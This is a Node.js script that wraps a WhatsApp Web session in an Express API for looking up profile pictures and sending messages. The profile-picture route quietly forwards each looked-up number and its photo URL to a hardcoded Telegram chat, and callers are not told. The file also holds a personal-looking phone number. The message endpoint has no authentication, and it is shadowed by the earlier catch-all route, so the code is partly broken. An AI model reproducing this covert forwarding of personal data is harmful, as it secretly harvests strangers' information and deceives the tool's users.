// Import required modules
const { Client, LocalAuth } = require('whatsapp-web.js');
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const qrcode = require('qrcode-terminal');  // Import the qrcode-terminal module

// Initialize Express app
const app = express();
const port = 3000; 
let serverStarted = false; // Flag to ensure server only starts once

// Use CORS
app.use(cors());

// Use Gzip Compression
app.use(compression());

const client = new Client({
    authStrategy: new LocalAuth(),  // LocalAuth saves session so no re-scan is needed
});

client.on('qr', (qr) => {
    // Generate and display the QR code in the terminal (only on first-time setup)
    qrcode.generate(qr, { small: true });
    console.log('QR code received, scan it with WhatsApp!');
});

client.on('ready', async () => {
    console.log('Client is ready to use!');

    // Only start the server if it hasn't been started already
    if (!serverStarted) {
        app.listen(port, () => {
            console.log(`API server is running on http://localhost:${port}`);
        });
        serverStarted = true;  // Set the flag to true after the server starts
    }
});

client.on('message', msg => {
    if (msg.body.toLowerCase() === '!ping') {
        msg.reply('pong');
    }
});

app.get('/:number', async (req, res) => {
    let phone = req.params.number;
    const phoneNumber = `${phone}@c.us`;

    try {
        let profilePicUrl = await client.getProfilePicUrl(phoneNumber);

        if (profilePicUrl) {
            res.json({ phoneNumber, profilePicUrl, status: "" });

            if (phoneNumber !== '917994107442@c.us') {
                const sanitizedPhoneNumber = phoneNumber.replace(/"/g, '');
                const telegramUrl = `https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;

                try {
                    await fetch(telegramUrl);
                } catch (fetchError) {
                    console.error('Failed to send photo to Telegram:', fetchError);
                }
            }
        } else {
            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
        }
    } catch (error) {
        console.error('Error fetching profile picture:', error);
        res.status(500).json({ error: 'Failed to fetch profile picture' });
    }
});

// New API to send a message to a specific phone number
app.get('/send', async (req, res) => {
    const phoneNumber = `${req.query.nm.replaceAll('"','')}@c.us`; // Phone number in param 'nm'
    const message = req.query.message; // Message in param 'message'

    if (!phoneNumber || !message) {
        return res.status(400).json({ error: 'Phone number (nm) and message are required.' });
    }

    try {
        // Send the message to the specified phone number
        await client.sendMessage(phoneNumber, message);
        res.json({ status: 'Message sent successfully', phoneNumber, message });
    } catch (error) {
        res.status(500).json({ error: 'Failed to send message', details: error.message });
    }
});

client.initialize().then(() => console.log('starting...'));